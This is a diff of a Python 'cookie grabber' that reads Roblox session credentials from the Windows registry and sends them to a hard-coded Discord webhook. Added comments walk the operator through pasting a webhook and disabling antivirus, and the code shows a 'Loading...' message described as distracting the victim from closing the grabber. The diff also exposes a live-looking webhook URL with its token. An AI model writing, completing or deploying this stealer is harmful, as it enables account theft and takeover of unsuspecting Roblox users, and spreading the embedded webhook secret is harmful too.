@@ -1,11 +1,28 @@
+############# how to fix errors ##############################
+# TUTORIAL : IF YOU'RE USING PYTHON FROM MICROSOFT STORE, YOU HAVE TO DO THIS:
+# PYTHON MICROSOFT STORE : go to cmd , type (pip install requests) and when its done, type (pip install robloxpy) then it should work !
+# TUTORIAL : IF YOU'RE USING PYTHON FROM python.org THEN YOU HAVE TO DO THIS:
+# PYTHON WEBSITE : go to cmd type (py -m pip install requests) and when its done, type (py -m pip install robloxpy) then it should work!
+###########################################################
 
+#################### config tutorial #################
+# scroll down until you find (webhook) then remove everything inside the " "
+# then, paste your webhook **INSIDE** the " "
+# run the app, when it closed, check your server and it should send the cookie, if not :
+# check if you're logged into roblox studio
+# turn of your anti virus
+################################################################
 
-import requests
-from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
-import robloxpy
-import robloxapi
-import json
-import os 
+try:
+    import requests
+    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+    import robloxpy
+    import robloxapi
+    import json
+    import os
+except:
+    print("Failed to import libraies. Please contact Mani.#0001 at discord to fix this problem.")
+    exit()
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
 print(dummy_message)
 webhookk = "https://discord.com/api/webhooks/984818452323770388/N-vZOax4RAojwzrjK4hwOuD22A_K4Mye3FmHcao8t4GVb-WA23Ztm_UPyy8f6PTkFW6x" # put webhook here
